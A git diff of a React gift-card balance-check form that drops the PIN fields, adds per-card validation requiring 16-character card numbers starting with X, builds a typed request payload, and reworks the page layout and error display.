@@ -7,9 +7,14 @@ import GiftCardItem from "./GiftCardItem";
 import DenominationSelector from "./DenominationSelector";
 import BalanceConfirmModal from "./GiftCardBalanceModal";
 import { GiftCard } from "./types";
-import { useGiftCardCheck } from "@/hooks/useGiftCardCheck";
+import { Payload, useGiftCardCheck } from "@/hooks/useGiftCardCheck";
 import { toast } from "sonner";
 
+type CardErrors = {
+  cardNumber?: string;
+
+  // pin?: string;
+};
 interface Props {
   onSubmit: (data: {
     cards: GiftCard[];
@@ -18,43 +23,65 @@ interface Props {
   onCancel: () => void;
 }
 
-export default function GiftCardBalanceForm({
-  onSubmit,
-  onCancel,
-}: Props) {
+export default function GiftCardBalanceForm({ onSubmit, onCancel }: Props) {
   const [cards, setCards] = useState<GiftCard[]>([
     {
       id: Date.now(),
       cardNumber: "",
-      pin: "",
-      noPin: false,
+      // pin: "",
+      // noPin: false,
     },
   ]);
 
   const [denomination, setDenomination] = useState<number | null>(null);
-  const [errors, setErrors] = useState<Record<number, string>>({});
   const [denominationError, setDenominationError] = useState("");
   const [successModal, setSuccessModal] = useState(false);
+  const [errors, setErrors] = useState<Record<number, CardErrors>>({});
 
   const { mutate, isPending } = useGiftCardCheck();
 
-  const handleChange = (
-    id: number,
-    field: keyof GiftCard,
-    value: string | boolean,
-  ) => {
-    setCards((prev) =>
-      prev.map((card) =>
-        card.id === id ? { ...card, [field]: value } : card,
-      ),
-    );
+const handleChange = (
+  id: number,
+  field: keyof GiftCard,
+  value: string | boolean,
+) => {
+  // 1. update cards
+  setCards((prev) =>
+    prev.map((card) =>
+      card.id === id
+        ? { ...card, [field]: value }
+        : card
+    )
+  );
 
-    setErrors((prev) => {
-      const copy = { ...prev };
-      delete copy[id];
-      return copy;
-    });
-  };
+  // 2. validate using updated value
+  setErrors((prev) => {
+  const copy = { ...prev };
+
+  const updatedCards = cards.map((c) =>
+    c.id === id ? { ...c, [field]: value } : c
+  );
+
+  const card = updatedCards.find((c) => c.id === id);
+  if (!card) return copy;
+
+  const number = card.cardNumber.trim();
+
+  if (!number) {
+    copy[id] = { cardNumber: "Card number is required." };
+  } else if (!/^X[A-Za-z0-9]{15}$/.test(number)) {
+    copy[id] = {
+      cardNumber: "Card number must start with X and be 16 characters.",
+    };
+  } else {
+    // ✅ THIS is what makes error disappear at 16 chars
+    delete copy[id];
+  }
+
+  return copy;
+});
+};
+
 
   const addCard = () => {
     setCards((prev) => [
@@ -62,8 +89,8 @@ export default function GiftCardBalanceForm({
       {
         id: Date.now() + Math.random(),
         cardNumber: "",
-        pin: "",
-        noPin: false,
+        // pin: "",
+        // noPin: false,
       },
     ]);
   };
@@ -79,31 +106,31 @@ export default function GiftCardBalanceForm({
   };
 
   const validate = () => {
-    const newErrors: Record<number, string> = {};
+    const newErrors: Record<number, CardErrors> = {};
 
     cards.forEach((card) => {
+      const cardError: CardErrors = {};
+
       const number = card.cardNumber.trim();
 
-      if (!number) {
-        newErrors[card.id] = "Card number is required";
-        return;
-      }
+     if (!number) {
+  cardError.cardNumber = "Card number is required.";
+} else if (!/^X[A-Za-z0-9]{15}$/.test(number)) {
+  cardError.cardNumber = "Card number must start with X and be 16 characters.";
+}
 
-      if (!/^[0-9a-zA-Z]{10,19}$/.test(number)) {
-        newErrors[card.id] =
-          "Card number must be 10–19 characters (letters or numbers)";
-        return;
-      }
+      // if (!card.noPin) {
+      //   const pin = card.pin.trim();
 
-      if (!card.noPin) {
-        if (!card.pin.trim()) {
-          newErrors[card.id] = "PIN is required";
-          return;
-        }
+      //   if (!pin) {
+      //     cardError.pin = "PIN is required.";
+      //   } else if (!/^\d{4,8}$/.test(pin)) {
+      //     cardError.pin = "PIN must be 4–8 digits.";
+      //   }
+      // }
 
-        if (!/^\d{4,8}$/.test(card.pin)) {
-          newErrors[card.id] = "PIN must be 4–8 digits";
-        }
+      if (Object.keys(cardError).length > 0) {
+        newErrors[card.id] = cardError;
       }
     });
 
@@ -111,39 +138,35 @@ export default function GiftCardBalanceForm({
 
     return Object.keys(newErrors).length === 0;
   };
+  const handleSubmit = () => {
+    setDenominationError("");
 
- const handleSubmit = () => {
-  setDenominationError("");
-
-  if (!denomination) {
-    setDenominationError("Please select a gift card value.");
-    return;
-  }
-
-  if (!validate()) return;
-
-  confirmSubmit();
-};
-
-
-const confirmSubmit = () => {
-  mutate(
-    {
-      cards,
-      denomination,
-    },
-    {
-      onSuccess: () => {
-        setSuccessModal(true);
-      },
-
-      onError: (error: any) => {
-        toast.error(
-          error?.message || "Something went wrong. Please try again."
-        );
-      },
+    if (!denomination) {
+      setDenominationError("Please select a gift card value.");
+      return;
     }
-  );
+
+    if (!validate()) return;
+
+    confirmSubmit();
+  };
+
+ const confirmSubmit = () => {
+  const payload: Payload = {
+    denomination,
+    cards: cards.map((c) => ({
+      cardNumber: c.cardNumber,
+      pin: "",        // or real value if you enable it later
+      noPin: true,    // or your logic
+    })),
+  };
+
+  mutate(payload, {
+    onSuccess: () => setSuccessModal(true),
+    onError: (error: any) => {
+      toast.error(error?.message || "Something went wrong. Please try again.");
+    },
+  });
 };
   return (
     <>
@@ -159,22 +182,35 @@ const confirmSubmit = () => {
               Enter one or more gift card numbers below to instantly check
               available balances.
             </p>
-
           </div>
 
           {/* Body */}
           <div className="grid grid-cols-1 lg:grid-cols-2">
             {/* Left */}
-            <div className="relative  h-[350px] sm:h-[700px]  lg:min-h-[750px]">
-              <img
-                src="/images/card2.png"
-                alt="Gift Card"
-                className="absolute inset-0 h-full w-full object-cover"
-              />
+            <div className="flex flex-col items-center bg-white pt-8 ">
+              {/* Heading */}
+              <div className="w-full text-center">
+                <h2 className="text-base lg:text-3xl font-extrabold uppercase tracking-wide text-[#1B2559] sm:text-4xl">
+                  Where to Find Your Card Number
+                </h2>
+
+                <p className="mt-2 text-sm lg:text-base text-gray-500 sm:text-lg">
+                  The card number is used to check your gift card balance.
+                </p>
+              </div>
+
+              {/* Image */}
+              <div className="mt-4 w-full max-w-4xl ">
+                <img
+                  src="/images/card1.png"
+                  alt="Gift Card"
+                  className="block w-full h-auto"
+                />
+              </div>
             </div>
 
             {/* Right */}
-            <div className="flex items-center justify-center px-4 py-8 sm:px-8 lg:px-16">
+            <div className="flex items-center justify-center px-4 py-8 sm:pr-8 lg:pr-32">
               <div className="w-full  space-y-6">
                 <DenominationSelector
                   value={denomination}
@@ -185,9 +221,7 @@ const confirmSubmit = () => {
                 />
 
                 {denominationError && (
-                  <p className="text-sm text-red-500">
-                    {denominationError}
-                  </p>
+                  <p className="text-sm text-red-500">{denominationError}</p>
                 )}
 
                 <div className="space-y-5">
@@ -196,10 +230,10 @@ const confirmSubmit = () => {
                       key={card.id}
                       index={index}
                       card={card}
+                      errors={errors[card.id]}
                       onChange={handleChange}
                       onRemove={removeCard}
                       canRemove={cards.length > 1}
-                      error={errors[card.id]}
                     />
                   ))}
                 </div>
@@ -231,9 +265,7 @@ const confirmSubmit = () => {
                         : "bg-black hover:bg-gray-900"
                     }`}
                   >
-                    {isPending && (
-                      <Loader2 className="h-4 w-4 animate-spin" />
-                    )}
+                    {isPending && <Loader2 className="h-4 w-4 animate-spin" />}
 
                     {isPending ? "Checking..." : "Check Balance"}
                   </button>
@@ -244,22 +276,20 @@ const confirmSubmit = () => {
         </div>
       </div>
 
-<BalanceConfirmModal
-  open={successModal}
-  amount={denomination}
-  onClose={() => {
-    setSuccessModal(false);
+      <BalanceConfirmModal
+        open={successModal}
+        amount={denomination}
+        onClose={() => {
+          setSuccessModal(false);
 
-    onSubmit?.({
-      cards,
-      denomination,
-    });
+          onSubmit?.({
+            cards,
+            denomination,
+          });
 
-    onCancel();
-  }}
-/>
-
-
+          onCancel();
+        }}
+      />
     </>
   );
 }
